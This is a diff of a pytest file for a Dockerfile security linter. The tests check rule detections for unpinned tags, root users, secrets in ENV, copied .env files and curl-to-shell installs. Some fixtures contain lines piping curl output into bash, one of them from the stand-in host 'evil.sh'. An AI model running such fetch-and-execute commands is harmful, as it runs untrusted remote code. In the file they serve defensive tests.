@@ -1,183 +1,192 @@
-"""Test cases for the main DockerfileOptimizer class."""
-
-from unittest.mock import patch
+"""Tests for the high-level analyze API."""
 
 import pytest
+from docker_optimizer.optimizer import analyze
+from docker_optimizer.rules import Severity
 
-from docker_optimizer.models import DockerfileAnalysis, OptimizationResult
-from docker_optimizer.optimizer import DockerfileOptimizer
 
-
-class TestDockerfileOptimizer:
-    """Test cases for DockerfileOptimizer."""
-
-    def setup_method(self):
-        """Set up test fixtures."""
-        self.optimizer = DockerfileOptimizer()
-
-    def test_optimizer_initialization(self):
-        """Test that optimizer initializes correctly."""
-        assert isinstance(self.optimizer, DockerfileOptimizer)
-
-    def test_analyze_dockerfile_basic(self):
-        """Test basic Dockerfile analysis."""
-        dockerfile_content = """
-FROM ubuntu:latest
-RUN apt-get update
-RUN apt-get install -y curl
-COPY . /app
+GOOD_DOCKERFILE = """\
+FROM python:3.12-slim
 WORKDIR /app
+COPY requirements.txt .
+RUN pip install --no-cache-dir -r requirements.txt
+COPY . .
+RUN useradd -m appuser
+USER appuser
+HEALTHCHECK --interval=30s CMD curl -f http://localhost:8000/health || exit 1
+CMD ["python", "app.py"]
 """
 
-        analysis = self.optimizer.analyze_dockerfile(dockerfile_content)
 
-        assert isinstance(analysis, DockerfileAnalysis)
-        assert analysis.base_image == "ubuntu:latest"
-        assert analysis.total_layers > 0
-        assert (
-            analysis.has_security_issues
-        )  # ubuntu:latest should trigger security warning
+def test_good_dockerfile_score():
+    report = analyze(GOOD_DOCKERFILE)
+    # Should score well — no critical issues
+    assert not report.critical
+    assert report.score >= 60  # may have minor info findings
 
-    def test_analyze_dockerfile_with_security_issues(self):
-        """Test that security issues are properly identified."""
-        dockerfile_content = """
-FROM ubuntu:latest
-USER root
-RUN apt-get update && apt-get install -y curl
-"""
 
-        analysis = self.optimizer.analyze_dockerfile(dockerfile_content)
+def test_no_user_is_critical():
+    df_content = "FROM ubuntu:22.04\nRUN apt-get update\nCMD [\"/bin/bash\"]\n"
+    report = analyze(df_content)
+    rule_ids = [f.rule_id for f in report.critical]
+    assert "RULE-07" in rule_ids
 
-        assert analysis.has_security_issues
-        assert any("latest" in issue.lower() for issue in analysis.security_issues)
-        assert any("root" in issue.lower() for issue in analysis.security_issues)
 
-    def test_analyze_dockerfile_with_optimization_opportunities(self):
-        """Test that optimization opportunities are identified."""
-        dockerfile_content = """
-FROM ubuntu:20.04
-RUN apt-get update
-RUN apt-get install -y curl
-RUN apt-get install -y wget
-"""
-
-        analysis = self.optimizer.analyze_dockerfile(dockerfile_content)
-
-        assert analysis.has_optimization_opportunities
-        assert any(
-            "layer" in opp.lower() for opp in analysis.optimization_opportunities
-        )
-
-    def test_optimize_dockerfile_basic(self):
-        """Test basic Dockerfile optimization."""
-        dockerfile_content = """
-FROM ubuntu:latest
-RUN apt-get update
-RUN apt-get install -y curl
-"""
-
-        result = self.optimizer.optimize_dockerfile(dockerfile_content)
-
-        assert isinstance(result, OptimizationResult)
-        # Verify optimization occurred (either size change or layer optimizations or security fixes)
-        assert (result.original_size != result.optimized_size or
-                len(result.layer_optimizations) > 0 or
-                len(result.security_fixes) > 0)
-        # Verify optimization improvements were made
-        assert "ubuntu:22.04" in result.optimized_dockerfile  # Latest tag was fixed
-        assert "--no-install-recommends" in result.optimized_dockerfile  # Package optimization
-        assert len(result.security_fixes) > 0  # Security improvements were made
-
-    def test_optimize_dockerfile_with_security_fixes(self):
-        """Test that security fixes are applied during optimization."""
-        dockerfile_content = """
-FROM ubuntu:latest
-USER root
-RUN apt-get update && apt-get install -y curl
-"""
-
-        result = self.optimizer.optimize_dockerfile(dockerfile_content)
-
-        assert result.has_security_improvements
-        assert "USER" in result.optimized_dockerfile
-        assert (
-            "root" not in result.optimized_dockerfile
-            or "USER" in result.optimized_dockerfile
-        )
-
-    def test_optimize_dockerfile_with_layer_optimizations(self):
-        """Test that layer optimizations are applied."""
-        dockerfile_content = """
-FROM ubuntu:20.04
-RUN apt-get update
-RUN apt-get install -y curl
-RUN apt-get install -y wget
-"""
-
-        result = self.optimizer.optimize_dockerfile(dockerfile_content)
-
-        assert result.has_layer_optimizations
-        # Should combine RUN statements
-        run_count = result.optimized_dockerfile.count("RUN")
-        original_run_count = dockerfile_content.count("RUN")
-        assert run_count < original_run_count
-
-    def test_analyze_and_optimize_integration(self):
-        """Test the complete analyze and optimize workflow."""
-        dockerfile_path = "/tmp/test_dockerfile"
-        dockerfile_content = """
-FROM ubuntu:latest
-RUN apt-get update
-RUN apt-get install -y curl vim
-COPY . /app
-WORKDIR /app
-EXPOSE 8080
-"""
-
-        # Mock file reading
-        with patch("builtins.open", mock_open(read_data=dockerfile_content)):
-            result = self.optimizer.analyze_and_optimize(dockerfile_path)
-
-        assert isinstance(result, OptimizationResult)
-        assert result.explanation
-        assert result.optimized_dockerfile != dockerfile_content
-
-    def test_get_size_estimation(self):
-        """Test size estimation functionality."""
-        dockerfile_content = """
-FROM alpine:3.18
-RUN apk add --no-cache curl
-"""
-
-        estimated_size = self.optimizer._estimate_size(dockerfile_content)
-
-        assert estimated_size is not None
-        assert "MB" in estimated_size or "GB" in estimated_size
-
-    @pytest.mark.parametrize(
-        "base_image,expected_type",
-        [
-            ("ubuntu:latest", "security"),
-            ("alpine:latest", "security"),
-            ("node:18-alpine", "optimization"),
-            ("python:3.9-slim", "optimization"),
-        ],
+def test_secret_in_env():
+    df_content = (
+        "FROM alpine:3.18\n"
+        "ENV DB_PASSWORD=supersecret123\n"
+        "USER nobody\n"
+        "CMD [\"sh\"]\n"
     )
-    def test_identify_issues_by_base_image(self, base_image, expected_type):
-        """Test that different base images trigger appropriate issue identification."""
-        dockerfile_content = f"FROM {base_image}\nRUN echo hello"
-
-        analysis = self.optimizer.analyze_dockerfile(dockerfile_content)
-
-        if expected_type == "security":
-            assert analysis.has_security_issues
-        else:
-            # Should have fewer security issues for optimized base images
-            assert len(analysis.security_issues) <= 1
+    report = analyze(df_content)
+    rule_ids = [f.rule_id for f in report.critical]
+    assert "RULE-08" in rule_ids
 
 
-def mock_open(read_data):
-    """Helper function to mock file opening."""
-    from unittest.mock import mock_open as _mock_open
+def test_copy_dotenv_critical():
+    df_content = (
+        "FROM alpine:3.18\n"
+        "COPY .env /app/.env\n"
+        "USER nobody\n"
+        "CMD [\"sh\"]\n"
+    )
+    report = analyze(df_content)
+    rule_ids = [f.rule_id for f in report.critical]
+    assert "RULE-09" in rule_ids
 
-    return _mock_open(read_data=read_data)
+
+def test_apt_no_clean_warning():
+    df_content = (
+        "FROM ubuntu:22.04\n"
+        "RUN apt-get update && apt-get install -y curl\n"
+        "USER nobody\n"
+    )
+    report = analyze(df_content)
+    rule_ids = [f.rule_id for f in report.warnings]
+    assert "RULE-03" in rule_ids
+
+
+def test_multiple_run_warning():
+    df_content = (
+        "FROM alpine:3.18\n"
+        "RUN apk add --no-cache curl\n"
+        "RUN apk add --no-cache git\n"
+        "RUN apk add --no-cache bash\n"
+        "USER nobody\n"
+    )
+    report = analyze(df_content)
+    rule_ids = [f.rule_id for f in report.warnings]
+    assert "RULE-02" in rule_ids
+
+
+def test_latest_tag_warning():
+    df_content = "FROM ubuntu:latest\nUSER nobody\n"
+    report = analyze(df_content)
+    rule_ids = [f.rule_id for f in report.warnings]
+    assert "RULE-01" in rule_ids
+
+
+def test_unpinned_tag_warning():
+    df_content = "FROM ubuntu\nUSER nobody\n"
+    report = analyze(df_content)
+    rule_ids = [f.rule_id for f in report.warnings]
+    assert "RULE-01" in rule_ids
+
+
+def test_multistage_no_flag():
+    df_content = (
+        "FROM golang:1.21 AS build\n"
+        "RUN go build -o /app main.go\n"
+        "FROM gcr.io/distroless/base\n"
+        "COPY --from=build /app /app\n"
+        "USER nonroot\n"
+        "CMD [\"/app\"]\n"
+    )
+    report = analyze(df_content)
+    rule_ids = [f.rule_id for f in report.warnings]
+    # Already multi-stage — RULE-12 should NOT fire
+    assert "RULE-12" not in rule_ids
+
+
+def test_build_tools_suggest_multistage():
+    df_content = (
+        "FROM ubuntu:22.04\n"
+        "RUN apt-get update && apt-get install -y gcc build-essential\n"
+        "RUN gcc -o app main.c\n"
+        "USER nobody\n"
+        "CMD [\"/app\"]\n"
+    )
+    report = analyze(df_content)
+    rule_ids = [f.rule_id for f in report.warnings + report.info + report.critical]
+    assert "RULE-12" in rule_ids
+
+
+def test_add_instead_of_copy_info():
+    df_content = (
+        "FROM alpine:3.18\n"
+        "ADD myapp.py /app/myapp.py\n"
+        "USER nobody\n"
+    )
+    report = analyze(df_content)
+    rule_ids = [f.rule_id for f in report.info]
+    assert "RULE-10" in rule_ids
+
+
+def test_add_tar_not_flagged():
+    df_content = (
+        "FROM alpine:3.18\n"
+        "ADD archive.tar.gz /opt/\n"
+        "USER nobody\n"
+    )
+    report = analyze(df_content)
+    rule_ids = [f.rule_id for f in report.info]
+    assert "RULE-10" not in rule_ids
+
+
+def test_curl_pipe_sh_critical():
+    df_content = (
+        "FROM ubuntu:22.04\n"
+        "RUN curl -sSL https://example.com/install.sh | bash\n"
+        "USER nobody\n"
+    )
+    report = analyze(df_content)
+    rule_ids = [f.rule_id for f in report.critical]
+    assert "RULE-16" in rule_ids
+
+
+def test_score_decreases_with_issues():
+    clean_report = analyze(GOOD_DOCKERFILE)
+    dirty_report = analyze(
+        "FROM ubuntu:latest\n"
+        "ENV PASSWORD=admin123\n"
+        "RUN curl https://evil.sh | bash\n"
+    )
+    assert dirty_report.score < clean_report.score
+
+
+def test_pip_no_cache_dir():
+    df_content = (
+        "FROM python:3.12-slim\n"
+        "RUN pip install requests flask\n"
+        "USER nobody\n"
+    )
+    report = analyze(df_content)
+    rule_ids = [f.rule_id for f in report.info]
+    assert "RULE-05" in rule_ids
+
+
+def test_heavy_base_image_info():
+    df_content = "FROM ubuntu:22.04\nUSER nobody\n"
+    report = analyze(df_content)
+    rule_ids = [f.rule_id for f in report.info]
+    assert "RULE-11" in rule_ids
+
+
+def test_analyze_path(tmp_path):
+    from docker_optimizer.optimizer import analyze_file
+    df = tmp_path / "Dockerfile"
+    df.write_text("FROM alpine:3.18\nUSER nobody\n")
+    report = analyze_file(str(df))
+    assert report.path == str(df)
+    assert not report.critical
